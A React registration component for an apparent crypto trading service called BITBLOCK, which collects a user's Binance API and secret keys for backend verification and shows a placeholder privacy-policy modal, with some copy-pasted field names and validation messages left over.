import React, { Component } from 'react'
import {Redirect} from 'react-router-dom'
import {connect} from 'react-redux'
import {register, login} from '../../../redux/actions'
import storageUtils from '../../../utils/storageUtils';
import { Form, Input, Button, notification, message, Modal} from 'antd'
import {getRestrictions2, verifyRegisterKeys} from '../../../api/index'
import MediaQuery from 'react-responsive'
import axios from "axios";

import '../register.less'

export class Register1 extends Component {
  state = {
    registerbuttonstatus: false,
    apiKey: '',
    secretKey: '',
    timelimiter: false,
    pressed: 0,
    showModal: false,
    checkverified: false
  }

  handleSubmit = async(e) => {
    e.preventDefault()
    this.setState({
      registerbuttonstatus: true
    })
    if(this.state.pressed <= 3 & this.state.timelimiter === false){
        this.setState({
            registerbuttonstatus: false,
            pressed: this.state.pressed + 1
        })
        var cancelToken = this.source.token

        var body2 = {
          'apiKey': this.state.apiKey,
          'secretKey': this.state.secretKey,
          'username': this.props.user.username,
          'cancelToken': cancelToken
        }
        var verify = await verifyRegisterKeys(body2, cancelToken)

        if(verify.status === 1){
            this.setState({
                checkverified: true
            })
            this.showModal()
         
        } else {
            message.error("Failed to verify authorization keys")
        }
    } else {
        this.updateTimeLimiter()
    }
      
  }

  updateTimeLimiter = async() => {
    this.setState({timelimiter: true})
    setTimeout(() => {
        this.setState({
            timelimiter: false,
            pressed: 0
        })
    }, 300000)

  }


  verifyRestrictions = async() => {
    var language = await storageUtils.getLanguage()
    var cancelToken = this.source.token


    var response = await getRestrictions2(language, cancelToken)
    if(response.status === 0){
      notification.config({
        maxCount: 1,
        duration: 10,
      });

      if(response.data['register'] === true){
        notification.error({
          message: 'Register Restricted',
          description:
          <div>
            <p>We detected an issue, come back later</p>
          </div>
        });
      }
    

    }
  }

  updateKey1 = (e) => {
    this.setState({
        apiKey: e.target.value
    })
  }

  updateKey2 = (e) => {
    this.setState({
        secretKey: e.target.value
    })
  }

  showModal = () => {
    if(this.state.checkverified === true){
        this.setState({
            showModal: true
        }) 
    }
     
  }

  handleOk = () => {
    this.setState({
        showModal: false
    })


    this.props.form.validateFields(async(error, values) => {
        if (error) {
          // console.log(error)
        } else {
            this.props.props5.login(this.props.values.userName, this.props.values.password);
            this.props.props5.history.replace('/home')

          }
        }
      )
  }

  handleCancel = () => {
    this.setState({
        showModal: false
    })

  }


  componentWillMount(){
    const CancelToken = axios.CancelToken;
    this.source = CancelToken.source();

    this.verifyRestrictions()
  }

  componentWillUnmount(){
    this.source.cancel('');
  }
  

  render() {
    if (this.props.user.username) {
      return <Redirect to='/login'/>
    }
    
    // const errorMsg = this.props.user.errorMsg
    const {getFieldDecorator} = this.props.form
    
    return (
      <div className='register'>
        <MediaQuery minWidth={730}>
        <section className='register-split register-content1'>
          <div style={{width: '90%', marginTop: '18%', display: 'grid', justifyContent: 'center', textAlign: 'center'}}>
              <h1 style={{fontSize: '23px',  marginTop: '8%', color: '#141414', fontWeight: '700' }}>Verify Binance Account</h1>
              <p style={{fontSize: '10px', fontFamily: '"Manrope", sans-serif',  color: '#8c8c8c'}}>To make sure we keep your account safe, you need to directly verify it !</p>
              <p style={{fontSize: '10px', fontFamily: '"Manrope", sans-serif', color: '#8c8c8c'}}>Your account will be set and ready for work.</p>
              <p style={{fontSize: '10px', fontFamily: '"Manrope", sans-serif', color: '#8c8c8c'}}>We care about your privacy.</p>

          </div>
          
          <Form onSubmit={this.handleSubmit}>
                  <p style={{fontSize: '12px',  fontFamily: '"Manrope", sans-serif', marginLeft: '10%', marginTop: '5%', color: '#141414'}}>API Key</p>
                  <Form.Item>
                    {
                      getFieldDecorator('county', {
                        rules: [{required: true, message: 'Country must be provided to create your first account'}, {whitespace: true, message: 'Country should not contain white spaces'}]
                      })(
                        <Input style={{width: '70%', marginLeft: '10%'}} onChange={this.updateKey1}/>

                      )
                    }
                    
                  </Form.Item>
                    <p style={{fontSize: '12px',  fontFamily: '"Manrope", sans-serif', marginLeft: '10%', marginTop: '5%', color: '#141414'}}>Secret Key</p>
                  <Form.Item className="input1">
                  {
                  getFieldDecorator('phonenumber', {
                    rules: [
                      {required: true, message: 'Phone Number must be filled'}, 
                      {whitespace: true, message: 'Phone Number cannot contain spaces'}, 
                      {pattern: /^[A-Za-z_0-9]+$/, message: 'Phone Number must be composed of letters, underscores or numbers'}]
                  })(
                    <Input style={{width: '70%', marginLeft: '10%'}} onChange={this.updateKey2}/>
                
                  )
                }
              </Form.Item>
                <Button disabled={this.state.registerbuttonstatus} loading={this.state.registerbuttonstatus} style={{width: '170px', marginLeft: '10%', color: 'white', borderColor: 'white', marginTop: 15, backgroundColor: '#0010f7'}} htmlType="submit" className="register-form-button">
                Continue
                </Button>
          </Form>
        </section>
        <section className='register-split register-content2'>

        </section>
        
        <Modal title="Privacy Policy" visible={this.state.showModal} onOk={this.handleOk} width={'70%'} onCancel={this.handleCancel}>
                <p>Make sure you meet with all the rules you aprove when create your BITBLOCK ID</p>
                <p>1.0 - </p>
                <p>1.2 - </p>
                <p>1.3 - </p>
                <p>1.4 - </p>
                <p>1.5 - </p>
                <p>1.6 - </p>
                <p>1.7 - </p>
                <p>1.8 - </p>
                <p>1.9 - </p>
                <p>1.10 - </p>
               
        </Modal>
          
      
        </MediaQuery>
        <MediaQuery maxWidth={729} minWidth={503}>
        <section className='register-split register-content1'>
        <div style={{width: '90%', marginTop: '18%', display: 'grid', justifyContent: 'center', textAlign: 'center'}}>
              <h1 style={{fontSize: '23px',  marginTop: '8%', color: '#141414', fontWeight: '700' }}>Verify Binance Account</h1>
              <p style={{fontSize: '10px', fontFamily: '"Manrope", sans-serif',  color: '#8c8c8c'}}>To make sure we keep your account safe, you need to directly verify it !</p>
              <p style={{fontSize: '10px', fontFamily: '"Manrope", sans-serif', color: '#8c8c8c'}}>Your account will be set and ready for work.</p>
              <p style={{fontSize: '10px', fontFamily: '"Manrope", sans-serif', color: '#8c8c8c'}}>We care about your privacy.</p>

          </div>
          <Form onSubmit={this.handleSubmit}>
                  <p style={{fontSize: '12px',  fontFamily: '"Manrope", sans-serif', marginLeft: '10%', marginTop: '5%', color: '#141414'}}>API Key</p>
                  <Form.Item>
                    {
                      getFieldDecorator('county', {
                        rules: [{required: true, message: 'Country must be provided to create your first account'}, {whitespace: true, message: 'Country should not contain white spaces'}]
                      })(
                        <Input style={{width: '70%', marginLeft: '10%'}} onChange={this.updateKey1}/>

                      )
                    }
                    
                  </Form.Item>
                    <p style={{fontSize: '12px',  fontFamily: '"Manrope", sans-serif', marginLeft: '10%', marginTop: '5%', color: '#141414'}}>Secret Key</p>
                  <Form.Item className="input1">
                  {
                  getFieldDecorator('phonenumber', {
                    rules: [
                      {required: true, message: 'Phone Number must be filled'}, 
                      {whitespace: true, message: 'Phone Number cannot contain spaces'}, 
                      {pattern: /^[A-Za-z_0-9]+$/, message: 'Phone Number must be composed of letters, underscores or numbers'}]
                  })(
                    <Input style={{width: '70%', marginLeft: '10%'}} onChange={this.updateKey2}/>
                
                  )
                }
              </Form.Item>
                <Button disabled={this.state.registerbuttonstatus} loading={this.state.registerbuttonstatus} style={{width: '170px', marginLeft: '10%',  color: 'white', borderColor: 'white',marginTop: 15, backgroundColor: '#0010f7'}} htmlType="submit" className="register-form-button">
                Continue
                </Button>
          </Form>
        </section>
        <section className='register-split register-content2'>

        </section>
        
        <Modal title="Privacy Policy" visible={this.state.showModal} onOk={this.handleOk} width={'100%'} onCancel={this.handleCancel}>
                <p>Make sure you meet with all the rules you aprove when create your BITBLOCK ID</p>
                <p>1.0 - </p>
                <p>1.2 - </p>
                <p>1.3 - </p>
                <p>1.4 - </p>
                <p>1.5 - </p>
                <p>1.6 - </p>
                <p>1.7 - </p>
                <p>1.8 - </p>
                <p>1.9 - </p>
                <p>1.10 - </p>
               
        </Modal>
        </MediaQuery>
        <MediaQuery maxWidth={502}>
        <section className='register-split register-content1' style={{textAlign: 'center'}}>
          <div style={{width: '100%', marginTop: '26%'}}>
              <h1 style={{fontSize: '21px', marginTop: '8%', color: '#141414', fontWeight: '700' }}>Approve Binance Account</h1>
              <p style={{fontSize: '10px', fontFamily: '"Manrope", sans-serif', color: '#8c8c8c'}}>To make sure we keep to our policy rules, you need to directly verify it !</p>
              <p style={{fontSize: '10px', fontFamily: '"Manrope", sans-serif', color: '#8c8c8c'}}>Your account will be set and ready for work.</p>
              <p style={{fontSize: '10px', fontFamily: '"Manrope", sans-serif', color: '#8c8c8c'}}>We care about your privacy.</p>

              <p style={{fontSize: '10px', fontFamily: '"Manrope", sans-serif', color: '#8c8c8c'}}>We care about your privacy.</p>
          </div>

          <Form onSubmit={this.handleSubmit}>
                  <p style={{fontSize: '12px',  fontFamily: '"Manrope", sans-serif',  marginTop: '5%', color: '#141414'}}>API Key</p>
                  <Form.Item>
                    {
                      getFieldDecorator('county', {
                        rules: [{required: true, message: 'Country must be provided to create your first account'}, {whitespace: true, message: 'Country should not contain white spaces'}]
                      })(
                        <Input style={{width: '85%'}} onChange={this.updateKey1}/>

                      )
                    }
                    
                  </Form.Item>
                    <p style={{fontSize: '12px',  fontFamily: '"Manrope", sans-serif', marginTop: '3%', color: '#141414'}}>Secret Key</p>
                  <Form.Item className="input1">
                  {
                  getFieldDecorator('phonenumber', {
                    rules: [
                      {required: true, message: 'Phone Number must be filled'}, 
                      {whitespace: true, message: 'Phone Number cannot contain spaces'}, 
                      {pattern: /^[A-Za-z_0-9]+$/, message: 'Phone Number must be composed of letters, underscores or numbers'}]
                  })(
                    <Input style={{width: '85%'}} onChange={this.updateKey2}/>
                
                  )
                }
              </Form.Item>
                <Button disabled={this.state.registerbuttonstatus} loading={this.state.registerbuttonstatus} style={{width: '220px',  color: 'white', borderColor: 'white',marginTop: 15, backgroundColor: '#0010f7'}} htmlType="submit" className="register-form-button">
                Continue
                </Button>
          </Form>
        </section>
        <section className='register-split register-content2'>

        </section>
        
        <Modal title="Privacy Policy" visible={this.state.showModal} onOk={this.handleOk} width={'100%'} onCancel={this.handleCancel}>
                <p>Make sure you meet with all the rules you aprove when create your BITBLOCK ID</p>
                <p>1.0 - </p>
                <p>1.2 - </p>
                <p>1.3 - </p>
                <p>1.4 - </p>
                <p>1.5 - </p>
                <p>1.6 - </p>
                <p>1.7 - </p>
                <p>1.8 - </p>
                <p>1.9 - </p>
                <p>1.10 - </p>
               
        </Modal>
        </MediaQuery>
        
      </div>
       
    )
    
  }
}
const WrapLogin = Form.create()(Register1)



export default connect(
    state => ({user: state.user, email: state.email, password: state.password, county: state.county, language: state.language, phonenumber: state.phonenumber  }),
    {register, login}
)(WrapLogin)
  